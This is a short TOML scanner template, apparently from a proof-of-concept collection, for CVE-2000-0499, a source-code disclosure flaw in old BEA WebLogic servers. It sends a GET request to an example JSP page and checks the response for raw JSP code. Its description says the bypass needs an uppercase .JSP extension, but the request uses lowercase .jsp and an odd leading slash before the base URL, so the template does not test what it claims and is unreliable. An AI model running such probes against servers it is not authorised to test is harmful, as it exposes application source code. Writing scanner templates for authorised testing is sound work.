[info]
author = "ave"
description = "验证 BEA WebLogic 3.1.8-4.5.1 默认配置下，通过请求大写 .JSP 扩展名绕过 JSP 编译直接获取源代码"
id = "POC-AVE-2000-0560"
name = "CVE-2000-0499 PoC"
severity = "high"
tags = ["ave-2000-0560"]
vuln_id = [
    "CVE-2000-0499",
    "AVE-2000-0560",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/examples/jsp/num/numguess.jsp"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%@",
    "<%",
    "import",
    "java.",
    "jsp:",
]

